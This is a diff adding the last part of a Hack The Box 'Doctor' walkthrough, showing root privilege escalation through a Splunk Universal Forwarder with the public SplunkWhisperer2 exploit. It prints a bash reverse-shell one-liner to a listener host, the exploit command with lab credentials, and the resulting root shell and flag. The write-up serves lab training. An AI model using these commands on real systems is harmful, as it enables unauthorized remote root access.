@@ -292,13 +292,65 @@ Run [LinPEAS Script](https://github.com/carlospolop/privilege-escalation-awesome
 
 Also I remember about Splunk. Let's use our credentials to login in Splunk.
 
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/d17.PNG)
 
+Search some some exploits in google and find good [article](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
+Article about a local privilege escalation, or remote code execution, through Splunk Universal Forwarder misconfigurations.
+
+Download exploit from [here](https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py)
+
+We will run reverse shell as rce in this exploit.
+
+```
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.9/4444 0>&1'
+```
+
+Run exploit.
+
+```
+┌──(root💀kali)-[/home/kali/HTB/Doctor]
+└─# python3 splunl_remote.py --host doctor.htb --port 8089 --username shaun --password Guitar123 --payload "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.9/4444 0>&1'" --lhost 10.10.16.9
+Running in remote mode (Remote Code Execution)
+[.] Authenticating...
+[+] Authenticated
+[.] Creating malicious app bundle...
+[+] Created malicious app bundle in: /tmp/tmp2p9zpdl3.tar
+[+] Started HTTP server for remote mode
+[.] Installing app from: http://10.10.16.9:8181/
+10.10.10.209 - - [19/Feb/2021 02:33:21] "GET / HTTP/1.1" 200 -
+[+] App installed, your code should be running now!
+
+Press RETURN to cleanup
+```
+
+We get reverse shell as **root**
+
+```
+┌──(root💀kali)-[/home/kali/HTB/Doctor]
+└─# nc -lvp 4444                                                                                               1 ⨯
+listening on [any] 4444 ...
+connect to [10.10.16.9] from doctor.htb [10.10.10.209] 35808
+bash: cannot set terminal process group (1136): Inappropriate ioctl for device
+bash: no job control in this shell
+root@doctor:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@doctor:/# cd ~
+cd ~
+root@doctor:/root# ls
+ls
+root.txt
+root@doctor:/root# cat root.txt
+cat root.txt
+4b7915dc36ce0f1274eb3d78d4dacb35
+```
 
 # Result and Resources
 
-1. https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
-2. https://netsec.ws/?p=337
-3. https://xakep.ru/2020/05/26/gitlab-exploit/
-4. https://forum.reverse4you.org/t/radare-2/1113
-5. https://medium.com/quiknapp/fuzz-faster-with-ffuf-c18c031fc480
-6. https://docs.gitlab.com/12.10/ee/security/reset_root_password.html
+1. https://defcon.ru/web-security/3840/
+2. https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+3. https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+4. https://portswigger.net/research/server-side-template-injection
+5. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+6. https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/
+7. https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
